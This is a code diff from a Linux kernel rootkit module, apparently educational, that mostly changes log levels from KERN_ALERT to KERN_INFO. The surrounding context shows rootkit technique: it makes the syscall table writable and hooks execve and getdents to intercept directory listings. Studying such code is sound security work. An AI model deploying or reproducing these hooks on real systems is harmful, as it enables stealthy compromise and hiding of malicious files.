@@ -179,8 +179,8 @@ t_syscall_hook *new_hook(const unsigned int offset, void *newFunc)
  */
 int init_module(void)
 {
-  printk(KERN_ALERT "Rootkit module initializing.\n");
-  printk(KERN_ALERT "root_uid parameter has value %d.\n", root_uid);
+  printk(KERN_INFO "Rootkit module initializing.\n");
+  printk(KERN_INFO "root_uid parameter has value %d.\n", root_uid);
 
   //Allocate & init a list to store our syscall_hooks
   hooks = kmalloc(sizeof(t_syscall_hook_list), GFP_KERNEL);
@@ -189,20 +189,18 @@ int init_module(void)
   //We need to hardcode the sys_call_table's location in memory. Remember array
   //indices in C are offsets from the base (i.e. 0th idex) address of the array.
   sys_call_table = (void *) table_addr;
-  printk(KERN_ALERT "Syscall table loaded from %p\n", (void*) table_addr);
+  printk(KERN_INFO "Syscall table loaded from %p\n", (void*) table_addr);
 
   set_addr_rw((unsigned long) sys_call_table);
-  printk(KERN_ALERT "After call to set_addr_rw\n");
 
   //Hook the syscall
   //hook_syscall(new_hook(__NR_open, (void*) &new_open)); //Uncomment to hook open()
   hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
   hook_syscall(new_hook(__NR_getdents, (void*) &new_getdents));
-  printk(KERN_ALERT "After call to hook_syscall\n");
 
   set_addr_ro((unsigned long) sys_call_table);
 
-  printk(KERN_ALERT "Rootkit module loaded successfully!\n");
+  printk(KERN_INFO "Rootkit module loaded successfully!\n");
   return 0; //For successful load
 }
 
@@ -216,7 +214,7 @@ void cleanup_module(void)
   t_syscall_hook_list   *hook_entry;
   t_syscall_hook        *hook;
 
-  printk(KERN_ALERT "Rootkit module unloaded\n");
+  printk(KERN_INFO "Rootkit module unloaded\n");
 
   //Iterate through the linked list of hook_entry's unhooking and deallocating
   //each as we go. We use the safe list_for_each because we are removing
@@ -235,7 +233,7 @@ void cleanup_module(void)
     kfree(hook_entry);
   }
 
-  printk(KERN_ALERT "Rootkit module cleanup complete\n");
+  printk(KERN_INFO "Rootkit module cleanup complete\n");
 }
 
 //To understand the gcc asmlinkage define see:
@@ -295,7 +293,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   char *buf = (char *) dirp;
   
   //Log that this hook was invoked, and which program invoked this hook
-  printk(KERN_ALERT "getdents() hook invoked for %s.\n", current->comm);
+  printk(KERN_INFO "getdents() hook invoked for %s.\n", current->comm);
 
   //Retrieve the regular getdents() function
   getdents_hook = find_syscall_hook(__NR_getdents);
@@ -315,7 +313,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
     d = (struct linux_dirent *) (buf + bpos);
     
     //Print the dir-entry's name
-    printk(KERN_ALERT "entry: %s\n", d->d_name);
+    printk(KERN_INFO "entry: %s\n", d->d_name);
     
     //Increment bpos by the record length, so we will be at the start
     //of the next struct linux_dirent for the next iteration
